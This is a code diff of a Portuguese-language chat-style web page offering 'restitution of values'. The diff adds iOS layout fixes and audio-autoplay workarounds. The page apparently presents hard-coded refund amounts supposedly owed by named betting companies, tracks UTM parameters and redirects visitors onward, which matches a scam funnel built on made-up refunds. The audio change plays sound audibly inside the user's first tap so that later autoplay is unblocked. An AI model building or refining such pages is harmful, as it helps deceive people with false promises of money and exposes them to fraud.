@@ -13,7 +13,7 @@
         <!-- Preservação de UTMs e navegação (helper único) -->
     <script src="js/utm-helper.js"></script>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no,viewport-fit=cover">
   <title>Restituição de Valores - Atendimento</title>
   <link rel="icon" href="images/favicon.ico" type="image/x-icon">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet">
@@ -36,7 +36,15 @@
 
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
 
-    body { background-color: var(--bg-color); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+    /* Altura dinâmica: desconta a barra de ferramentas do Safari no iOS */
+    body {
+      background-color: var(--bg-color);
+      height: 100vh;        /* fallback navegadores antigos */
+      height: 100dvh;       /* iOS Safari 15.4+ / Chrome mobile */
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
 
     header { background: var(--white); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05); z-index: 100; border-bottom: 3px solid var(--primary-color); }
     header .logo img { height: 35px; }
@@ -45,7 +53,16 @@
     nav { background: var(--white); padding: 10px 20px; display: flex; align-items: center; font-size: 13px; color: #666; border-bottom: 1px solid var(--gray-light); }
     nav i { margin: 0 8px; color: var(--primary-color); }
 
-    #chat-content { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px; background-color: var(--white); }
+    #chat-content {
+      flex: 1;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      padding: 20px 20px calc(20px + env(safe-area-inset-bottom));
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      background-color: var(--white);
+    }
 
     .message-row { display: flex; width: 100%; }
     .message-row.bot { justify-content: flex-start; }
@@ -64,7 +81,14 @@
 
     @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
 
-    #controls { padding: 15px 20px; background: #fff; border-top: 1px solid #eee; display: none; align-items: center; justify-content: center; }
+    #controls {
+      padding: 15px 20px calc(15px + env(safe-area-inset-bottom));
+      background: #fff;
+      border-top: 1px solid #eee;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
     #controls.active { display: flex; }
 
     .chat-options { display: flex; flex-direction: column; gap: 10px; padding: 5px 0 5px 36px; max-width: 90%; }
@@ -82,7 +106,7 @@
     .bubble:has(.media-container), .bubble:has(.comprovante), .bubble:has(.documento-valores) { width: 85%; max-width: 85%; }
     .media-container img { width: 100%; height: auto; display: block; }
 
-    footer { background: #001C4E; padding: 12px; text-align: center; }
+    footer { background: #001C4E; padding: 12px 12px calc(12px + env(safe-area-inset-bottom)); text-align: center; }
     footer img { height: 22px; opacity: 0.9; }
 
     /* ============ ANIMAÇÕES ============ */
@@ -338,9 +362,9 @@
       { nome: 'BPX Bets Sports Group Ltda.',             valor: 'R$ 225,15',   valorNum: 225.15 },
       { nome: 'H2 Licensed Ltda.',                       valor: 'R$ 342,80',   valorNum: 342.80 },
       { nome: 'Pixbet Soluções Tecc Ltda.',              valor: 'R$ 475,30',   valorNum: 475.30 },
-      { nome: 'NVBT Gaming Ltda.',                       valor: 'R$ 210,55',   valorNum: 210.55 },
-      { nome: 'SevenX Gaming S/A.',                      valor: 'R$ 285,40',   valorNum: 285.40 },
-      { nome: 'NSX Betfair Brasil S.A.',                 valor: 'R$ 398,70',   valorNum: 398.70 },
+      { nome: 'NVBT Gaming Ltda.',                        valor: 'R$ 210,55',   valorNum: 210.55 },
+      { nome: 'SevenX Gaming S/A.',                       valor: 'R$ 285,40',   valorNum: 285.40 },
+      { nome: 'NSX Betfair Brasil S.A.',                  valor: 'R$ 398,70',   valorNum: 398.70 },
       { nome: 'Apollo Operations Ltda.',                 valor: 'R$ 454,81',   valorNum: 454.81 }
     ];
 
@@ -361,22 +385,37 @@
       } catch (e) {}
     });
 
+    // iOS: o play() audível precisa acontecer DENTRO do gesto do usuário.
+    // Toca audível e pausa imediatamente — o blip é imperceptível e
+    // libera o áudio programático para o restante da sessão.
     function unlockAllAudios() {
       ALL_AUDIO_PATHS.forEach(src => {
         const audio = AUDIO_POOL[src];
         if (audio && !audio.dataset.unlocked) {
           try {
-            audio.muted = true;
+            audio.muted = false;
+            audio.volume = 1;
             const p = audio.play();
             if (p !== undefined) {
-              p.then(() => { audio.pause(); audio.currentTime = 0; audio.muted = false; audio.dataset.unlocked = 'true'; }).catch(() => { audio.muted = false; });
+              p.then(() => {
+                audio.pause();
+                audio.currentTime = 0;
+                audio.dataset.unlocked = 'true';
+              }).catch(() => {});
+            } else {
+              // Navegadores antigos (play síncrono)
+              audio.pause();
+              audio.currentTime = 0;
+              audio.dataset.unlocked = 'true';
             }
-          } catch (e) { audio.muted = false; }
+          } catch (e) {}
         }
       });
     }
 
+    // touchend é mais confiável que touchstart no iOS para desbloquear áudio
     document.addEventListener('touchstart', unlockAllAudios, { passive: true });
+    document.addEventListener('touchend', unlockAllAudios, { passive: true });
     document.addEventListener('click', unlockAllAudios, { passive: true });
 
     function stopAllAudios(exceptAudio = null) {
@@ -987,25 +1026,23 @@ window.location.href = finalUrl;
           });
         });
 
-        const startAutoplay = () => {
-          stopAllAudios(audio);
-          audio.currentTime = 0;
-          const playPromise = audio.play();
-          if (playPromise !== undefined) {
-            playPromise.then(() => { updatePlayingState(true); }).catch(() => {
-              const resumeAudio = () => {
-                stopAllAudios(audio);
-                audio.play().then(() => updatePlayingState(true)).catch(() => {});
-                document.removeEventListener('click', resumeAudio);
-                document.removeEventListener('touchstart', resumeAudio);
-              };
-              document.addEventListener('click', resumeAudio, { once: true });
-              document.addEventListener('touchstart', resumeAudio, { once: true });
-            });
-          }
-        };
+        const startAutoplay = (attempt = 0) => {
+  stopAllAudios(audio);
+  audio.currentTime = 0;
+  const playPromise = audio.play();
+  if (playPromise !== undefined) {
+    playPromise.then(() => {
+      updatePlayingState(true);
+    }).catch(() => {
+      if (attempt < 3) {
+        setTimeout(() => startAutoplay(attempt + 1), 800);
+      }
+      // Se falhar definitivamente, o botão de play manual continua funcionando
+    });
+  }
+};
 
-        setTimeout(startAutoplay, 300);
+setTimeout(() => startAutoplay(), 300);
       });
     }
 
